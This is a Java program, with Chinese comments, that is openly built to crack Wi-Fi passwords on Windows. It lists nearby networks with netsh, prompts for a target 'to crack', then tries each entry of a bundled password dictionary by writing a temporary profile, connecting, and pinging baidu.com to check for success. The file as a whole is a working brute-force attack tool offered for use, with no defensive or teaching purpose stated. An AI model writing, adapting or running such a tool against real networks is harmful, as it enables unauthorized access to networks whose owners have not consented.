package com.znkeji.zn_wifi_carck;

import com.znkeji.zn_wifi_carck.utils.CmdUtils;
import com.znkeji.zn_wifi_carck.utils.StringUtils;
import com.znkeji.zn_wifi_carck.utils.WiFiUtils;
import org.springframework.util.FileCopyUtils;

import java.io.BufferedReader;
import java.io.File;
import java.io.FileReader;
import java.io.IOException;
import java.util.*;
import java.util.stream.Collectors;

/**
 * Created with IntelliJ IDEA.
 * User: fangcheng
 * Date: 2019/3/23
 * Time: 20:18
 * Description: 启动类，项目的入口
 */
public class App {


    public static void main(String[] args) throws IOException {

        List<String> wifiList = CmdUtils.execute("netsh wlan show networks mode=bssid", "./");
        List<String> ssidList = getSsidList(wifiList);
        for (int i = 0; i < ssidList.size(); i++) {
            System.out.println((i+1)+"."+ssidList.get(i));
        }
        System.out.println("请输入要破解的wifi:");

        Scanner sca =new Scanner(System.in);
        sca.useDelimiter("\n");
        String ssid = sca.next();

        System.out.println("-----------您选择的wifi为【"+ssid+"】-------------");
        System.out.println("-----------开始破解-------------");

        String path = App.class.getClassLoader().getResource("pwd.txt").getPath();
        BufferedReader reader = new BufferedReader(new FileReader(path));
        List<String> list = reader.lines().collect(Collectors.toList());
        // 倒叙密码
        // Collections.reverse(list);

        int i = 0;
        for (String pwd : list) {
            i++;
            System.out.println("开始连接："+i+" -->"+ssid+" - "+pwd);
            boolean success = connect(ssid, pwd);
            if(success){
                System.out.println("连接成功，"+ssid+"的密码为"+pwd);
                return;
            }
        }

    }

    /**
     * 连接wifi
     * @param ssid
     * @param wifiPwd
     */
    private static boolean connect(String ssid, String wifiPwd) {
        try {
            String hex = StringUtils.str2HexStr(ssid);
            //生成wifi配置文件
            String wifiConf = WiFiUtils.getWifiStr(ssid, hex,wifiPwd);
            File out = new File("./temp.xml");
            FileCopyUtils.copy(wifiConf.getBytes(), out);
            //添加配置文件
            printList(CmdUtils.execute("netsh wlan add profile filename=temp.xml","./"));;
            //连接wifi
            printList(CmdUtils.execute("netsh wlan connect name=\""+ssid+"\"","./"));;
            //测试网络，使用ping的方式检测网络，此处建议优化改其他效率更高的方式，暂停2000毫秒是因为连接WiFi需要时间，这个时间因环境而异
            CmdUtils.execute("ipconfig","./");
            Thread.sleep(5000);
            boolean success = ping();
            return success;

        }catch (Exception e){
            e.printStackTrace();
        }
        return false;
    }

    /**
     * 获得ssidList
     * @param resultList 通过cmd命令查出来的附件WiFi
     * @return
     */
    private static List<String> getSsidList(List<String> resultList) {
        List<String> ssidList = new ArrayList<String>();
        Map<String, Integer> map = new HashMap<>(resultList.size());
        //遍历result获得ssid
        for(int i = 0; i < resultList.size(); i++){
            String result = resultList.get(i);
            if(!result.startsWith("SSID")){
                continue;
            }

            String ssid = result.substring(result.indexOf(":")+2);
            String xinHao = resultList.get(i + 5);
            Integer signal = Integer.valueOf(xinHao.substring(xinHao.indexOf("%") - 2, xinHao.indexOf("%")));
            map.put(ssid, signal);
        }

        if (map.size() == 0) {
            return ssidList;
        }

        System.out.println("wifi信号强度" + map);
        LinkedHashMap<String, Integer> linkedHashMap = map.entrySet().stream().sorted(Map.Entry.comparingByValue(Comparator.reverseOrder()))
                .collect(Collectors.toMap(Map.Entry::getKey, Map.Entry::getValue, (oldVal, newVal) -> oldVal, LinkedHashMap::new));
        ssidList.addAll(linkedHashMap.keySet());
        System.out.println("wifi信号强到弱排序" +  ssidList);

        return ssidList;
    }

    /**
     * 打印list数据
     * @param resultList
     */
    private static void printList(List<String> resultList) {
        for (String result : resultList) {
            System.out.println(result);
        }
    }

    /**
     * ping 校验
     */
    private static boolean ping() {
        boolean pinged = false;
        String cmd = "ping www.baidu.com";
        List<String> result = CmdUtils.execute(cmd, "./");
//        printList(result);
        if (result != null && result.size() > 0) {
            for (String item : result) {
                if (item.contains("来自")) {
                    pinged = true;
                    break;
                }
            }
        }
        return pinged;
    }



}
